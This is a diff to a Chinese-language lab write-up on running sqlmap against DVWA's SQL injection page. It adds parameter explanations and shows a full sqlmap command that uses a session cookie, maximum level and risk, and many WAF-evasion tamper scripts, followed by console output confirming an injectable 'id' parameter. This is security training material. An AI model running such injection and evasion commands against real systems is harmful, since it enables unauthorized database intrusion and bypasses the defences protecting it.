@@ -415,8 +415,15 @@ sqlmap got a 302 redirect to 'http://120.114.140.30:80/DVWA/login.php'. Do you w
 ```
 
 ### 使用SQLmap繞過WAF
+- Sqlmap 參數介紹:
+	- `-u`：進行測試的網址
+	- `--cookie`：輸入cookie參數，因為DVWA適用cookie判斷是否登入，所以要輸入參數才能登入，否則會被判斷轉換至login.php頁面
+	- `--level`：要執行的測試級別
+	- `--risk`：測試執行的風險
+	- `--tamper`：要加入腳本測試篡改資料
+	- `--flush-session`：因為測試腳本會有cache的問題，因此需要刷新測試
 ```Bash
- python sqlmap.py -u "http://120.114.140.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=ikv86pst3juaqapnlncss7vk42" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --flush-session
+$ python sqlmap.py -u "http://120.114.140.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=ikv86pst3juaqapnlncss7vk42" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --flush-session
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.2.4.18#dev}
@@ -456,7 +463,7 @@ it appears that you might have mixed the order of tamper scripts. Do you want to
 [21:27:34] [INFO] flushing session file
 [21:27:34] [INFO] testing connection to the target URL
 [21:27:34] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
-#這邊偵測到WAF防護，按y接受檢測
+# 這邊偵測到WAF防護，按y接受檢測
 [21:27:34] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
 do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] y
 [21:27:36] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
@@ -495,7 +502,7 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 [21:28:00] [INFO] checking if the injection point on GET parameter 'id' is a false positive
 [21:28:01] [WARNING] it appears that some non-alphanumeric characters (i.e. ()) are filtered by the back-end server. There is a strong possibility that sqlmap won't be able to properly exploit this vulnerability
 [21:28:01] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
-# 偵測到'id'是個攻擊參數，按y跳過其他參數測試
+# 偵測到"id"是個攻擊參數，按y跳過其他參數測試
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 650 HTTP(s) requests:
 ---
